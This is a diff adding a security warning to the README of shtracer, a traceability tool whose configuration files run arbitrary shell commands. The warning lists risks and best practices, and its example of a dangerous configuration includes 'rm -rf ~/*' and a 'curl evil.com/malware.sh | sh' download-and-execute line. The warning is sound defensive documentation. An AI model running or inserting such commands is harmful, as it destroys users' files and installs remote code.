@@ -228,6 +228,41 @@ For details, see documents in `./docs/` directory.
 * [highlight.js](https://highlightjs.org/) (for syntax highlighting)
 * [mermaid.js](https://mermaid.js.org/) (for showing UMLs)
 
+## ⚠️ Security Considerations
+
+**IMPORTANT: Only use trusted configuration files.**
+
+shtracer executes shell commands specified in configuration files through the following features:
+
+* **PRE-EXTRA-SCRIPT**: Arbitrary shell commands executed before processing
+* **POST-EXTRA-SCRIPT**: Arbitrary shell commands executed after processing
+
+### Security Risks
+
+1. **Arbitrary Code Execution**: Malicious configuration files can execute any shell command with your user permissions
+2. **File System Access**: Scripts can read, modify, or delete files accessible to your user account
+3. **Network Access**: Scripts can make network connections or download additional malicious code
+
+### Best Practices
+
+* ✅ **Only use configuration files from trusted sources**
+* ✅ **Review PRE-EXTRA-SCRIPT and POST-EXTRA-SCRIPT contents before execution**
+* ✅ **Avoid running shtracer with elevated privileges (sudo)**
+* ✅ **Use version control to track configuration file changes**
+* ❌ **Never execute configuration files from untrusted or unknown sources**
+
+### Example of Potentially Dangerous Configuration
+
+```markdown
+* **PRE-EXTRA-SCRIPT**: `rm -rf ~/*`  <!-- ⚠️ DANGEROUS: Deletes all user files -->
+* **POST-EXTRA-SCRIPT**: `curl evil.com/malware.sh | sh`  <!-- ⚠️ DANGEROUS: Downloads and executes remote code -->
+```
+
+**For security-sensitive environments, consider:**
+* Auditing all configuration files before use
+* Running shtracer in a sandboxed environment (containers, VMs)
+* Implementing organization-specific configuration file approval processes
+
 ## 📝 Contribution
 
 * RTM is important not only in software field but also in other fields, so that contributions from other fields are welcomed.
